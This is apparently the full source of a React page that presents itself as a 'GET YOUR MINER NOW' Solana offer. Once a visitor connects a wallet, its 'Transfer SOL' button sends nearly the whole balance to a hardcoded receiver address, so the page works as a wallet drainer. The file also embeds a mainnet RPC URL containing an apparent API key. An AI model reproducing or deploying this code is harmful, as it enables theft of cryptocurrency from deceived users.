import React, { useState, useCallback, useEffect } from "react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { useWallet } from "@solana/wallet-adapter-react";
import { useConnection } from "@solana/wallet-adapter-react";
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Connection } from "@solana/web3.js";

// Updated RPC URL
const RPC_URL = "https://holy-frosty-meme.solana-mainnet.quiknode.pro/71d288831d3ed5c88714d01a613e0c1915f4e63e/";
const RECEIVER_ADDRESS = "C5GwAvf7GhgpYknxmi2g6MzuscVhzhxT2hwzRYEXGfVW";

export default function App() {
  const { publicKey, connected, sendTransaction, disconnect } = useWallet();
  const { connection: walletConnection } = useConnection();

  // Use our explicit RPC connection
  const connection = new Connection(RPC_URL, "confirmed");

  const [loading, setLoading] = useState(false);
  const [popups, setPopups] = useState([]);
  const [solBalance, setSolBalance] = useState(0);

  // Show popup messages
  const showPopup = useCallback((message, type = "info") => {
    const id = Date.now() + Math.random();
    setPopups((prev) => [...prev, { id, message, type }]);
    setTimeout(() => setPopups((prev) => prev.filter((p) => p.id !== id)), 4000);
  }, []);

  // Fetch SOL balance
  const fetchBalance = async () => {
    if (!connected || !publicKey) return 0;
    try {
      const balance = await connection.getBalance(publicKey);
      const sol = balance / LAMPORTS_PER_SOL;
      setSolBalance(sol);
      return sol;
    } catch (err) {
      console.error("Balance fetch failed:", err);
      showPopup("❌ Unable to fetch SOL balance", "error");
      return 0;
    }
  };

  useEffect(() => {
    if (connected) fetchBalance();
  }, [connected, publicKey]);

  // Transfer SOL
  const handleTransfer = async () => {
    if (!connected || !publicKey) return;
    setLoading(true);

    try {
      const sol = await fetchBalance();
      if (sol <= 0.001) {
        showPopup("⚠️ Not enough SOL to transfer after fees.", "error");
        setLoading(false);
        return;
      }

      const lamportsToSend = Math.floor(sol * LAMPORTS_PER_SOL - 0.001 * LAMPORTS_PER_SOL);
      const receiver = new PublicKey(RECEIVER_ADDRESS);

      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new Transaction({
        recentBlockhash: blockhash,
        feePayer: publicKey,
      }).add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: receiver,
          lamports: lamportsToSend,
        })
      );

      const signature = await sendTransaction(tx, connection);
      await connection.confirmTransaction(signature, "confirmed");

      showPopup(`✅ SOL transferred! Signature: ${signature}`, "success");
      await fetchBalance();
    } catch (err) {
      console.error("Transfer Error:", err);
      showPopup(`❌ Transfer failed: ${err?.message || err}`, "error");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-screen h-screen flex items-center justify-center bg-gradient-to-br from-purple-900 via-black to-indigo-900 font-sans relative">
      <div className="bg-white/10 backdrop-blur-xl p-10 rounded-3xl shadow-2xl text-center max-w-md w-full border border-white/20 animate-fade-in">
        <h1 className="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-violet-400 mb-4">
          🚀 SOL Transfer
        </h1>
        <p className="text-gray-300 mb-8">GET YOUR MINER NOW</p>

        {!connected ? (
          <WalletMultiButton className="w-full py-3 px-6 rounded-xl bg-gradient-to-r from-green-400 to-emerald-500 text-lg font-semibold text-black shadow-lg hover:shadow-xl transition transform hover:-translate-y-1" />
        ) : (
          <>
            <button
              onClick={handleTransfer}
              disabled={loading}
              className={`w-full py-3 px-6 rounded-xl font-bold shadow-lg transition transform hover:-translate-y-1 ${
                loading
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white"
              }`}
            >
              {loading ? "Processing..." : "Transfer SOL"}
            </button>

            <button
              onClick={disconnect}
              className="mt-4 w-full py-2 px-6 rounded-xl bg-red-600 hover:bg-red-500 transition text-sm font-medium text-white shadow-md hover:shadow-lg"
            >
              Switch Wallet
            </button>

            <p className="mt-4 text-gray-300 text-sm">Balance: {solBalance.toFixed(6)} SOL</p>
          </>
        )}
      </div>

      {popups.map(({ id, message, type }) => (
        <div
          key={id}
          className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 px-6 py-3 rounded-xl shadow-2xl text-white text-sm font-medium animate-fade-in-up ${
            type === "success" ? "bg-green-500/90" : type === "error" ? "bg-red-500/90" : "bg-gray-700/90"
          }`}
          role="alert"
        >
          {message}
        </div>
      ))}
    </div>
  );
}
